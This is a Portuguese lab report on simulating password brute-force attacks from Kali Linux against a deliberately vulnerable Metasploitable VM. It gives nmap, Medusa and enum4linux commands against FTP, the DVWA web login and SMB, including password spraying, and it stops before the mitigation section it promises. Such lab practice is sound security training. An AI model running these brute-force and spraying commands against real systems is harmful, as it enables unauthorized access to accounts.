# Relatório da simulação de Ataque de Brute Force de Senhas com Medusa e Kali Linux

 O realtório será dividido em 3 partes. Na primeira parte irei passar pelo hardware e software usado na simulação. Na segunda parte irei explicar como foi feito a simulação do ataque de Brute Force e na última eatapa, irei comentar quais ações podem ser usadas para mitigar as vunerabilidades exploradas.

## Hardware e Software

 Utilizei um notebook com 32GB de mémoria RAM e um processador AMD Ryzen 7 5800H com 8 núcleos e 16 threads. Na parte de software, usei o VirtualBox para virtualizar os sistemas operacionais Kali Linux e um linux modificado para pentest chamado Metasploitable. Já os softwares para executar as simulações foram: NMap, Medusa e Hydra.

## Executando a simulação de Brute Force

### Encontrando o alvo

No inicio da simulação, é aconselhado entrar na máquina virtual onde está sendo executado o Metasploitable e executar o comando ip -a para identificar o ip para usarmos na simulação. Devido a um problema na configuração da placa de rede no VirtuaBox, decidi usar um roteador de backup e sem internet para fazer a simulação. Além disso coloquei as placas de rede em modo Bridge e o problema foi resolvido.

Como fiz essa alteração na rede que as máquinas virtuais estavam conectadas, decidi usar o comando nmap -sS endereço de rede/24 para executar uma varredura na rede e descobrir quais máquinas estavam conectadas no roteador. É importante salientar que coloquei mais algumas dispositivos na rede de proposito para a simulação ficar mais realista.

### Simulando Ataque FTP Simulando um cenário de auditoria em um servidor FTP que pode conter falhas de segurança

1º - Enumeração para descobrir quais serviços estão disponíveis no sistema com suspeita de vulnerabilidade. comando: nmap -sV -p 21,22,80,445,139 nú.me.ro.ip

Este comando escaneia as portas 21,22,80,445 e 139. O parâmetro -sV identifica a versão do serviço que está rodando em cada porta.


2º - Conectando diretamente ao ftp para confirmar se está ativo.

Comando: ftp nú.me.ro.ip

Caso a conexão aconteça pedirá o login e a senha. Como ainda não sabemos nenhum dos dois precisaremos fazer um ataque brute force (força bruta) utilizando a ferramenta Medusa para tentar descobri-los. Antes disso temos que criar duas listas: uma com possíveis nomes de usuários e outra com senhas comuns.

Para sair do ftp é só digitar quit e apertar enter e para limpar a tela do terminal é só digitar clear e apertar enter


### Criando nomes de usuários e senhas comuns (wordlists) em diferentes arquivos e rodando o ataque

1º - Comandos para criar e salvar no Kali Linux arquivo de texto com possíveis nomes de usuários e arquivo com senhas comuns.

Comando usuários: echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Comando senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt


2º - Rodando o ataque com a Medusa

Comando: medusa -h nú.me.ro.ip -U users.txt -P pass.txt -M ftp -t6

Onde -t6 significa que estamos usando 6 threads simultâneas, o que torna o ataque mais rápido.

No ataque foram encontrados o login msfadmin e a senha msfadmin como credenciais válidas. Isso significa que conseguimos acessar o sistema via ftp com essas credenciais.


3º - Validando manualmente o acesso via ftp com as credenciais encontradas

Comando: ftp nú.me.ro.ip


### Simulando Ataque web (http) Simulando ataque brute force em formulários de login web (http) no sistema dvwa

1º - Acessar, no navegador firefox do Kali Linux, o endereço nú.me.ro.ip/dvwa/login.php para visualizar a página de teste de login do dvwa.

Na sequência abrir o painel de ferramentas do desenvolvedor na página de teste de login do dvwa clicando em f12 e em seguida clicar na guia network, na navegação do tipo POST e em Request, que nos mostrará tudo o que o navegador está enviando e recebendo durante a interação, incluindo os nomes dos parâmetros que o servidor espera receber. A Medusa vai simular em cima destes parâmetros.


2º - No terminal do Kali, após criadas as wordlists de usuários e de senhas, rodar o seguinte comando com a Medusa.

Comando: medusa -h nú.me.ro.ip -U users.txt -P pass.txt -M http

-m PAGE:'/dvwa/login.php'

-m FORM:'username=^USER^&password=^PASS^&Login=Login'

-m 'FAIL=Login failed' -t 6

As credenciais corretas encontradas aparecerão com a palavra SUCCESS.

Em seguida utilizamos o primeiro login e senha encontrados para acessar o sistema.


### Simulando Ataque SMB (Server Message Block) Simulando ataques de enumeração e spraying contra o serviço SMB (Server Message Block)

1º - Rodar a enumeração de usuários com enum4linux

Comando: enum4linux -a 192.168.56.101 | tee enum4_output.txt

2º - Na sequência podemos abrir o arquivo do comando que acabamos de rodar e visualizar usuários que sejam possíveis alvos de ataques. O número rid é o identificador relativo do usuário no sistema. Sempre que houver nomes de usuários genéricos como null ou interrogação geralmente são de usuários mais vulneráveis.

Comando: less enum4_output.txt

3º - Criando wordlists de usuários

No comando anterior conseguimos acesso aos nomes dos usuários reais, agora precisamos criar nosso arquivo de alvos e nosso arquivo de senhas.

Comando: echo -e "user\nmsfadmin\nservice" > smb_users.txt

Comando: echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray

Ao contrário do brute force, que testa muitas senhas em um único usuário, o password spraying testa poucas senhas em muitos usuários.


4º - Rodando ataque com Medusa

Comando: medusa -h nú.me.ro.ip -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Onde: 

-h é o IP do nosso alvo. 

-U é a lista de usuários descoberta na enumeração. 

-P é a lista de senhas fracas. 

-M smbnt é o módulo específico para ataques via smb. 

-t 2 é uma das duas threads simultâneas, que simulam 2 usuários testando senhas. 

-T 50 significa até 50 hosts em paralelo.


5º - Testando o acesso utilizando smbclient

Verifica se teremos acesso como administrador através das credenciais encontradas no ataque anterior.

Comando: smbclient -L //192.168.56.101 -U msfadm
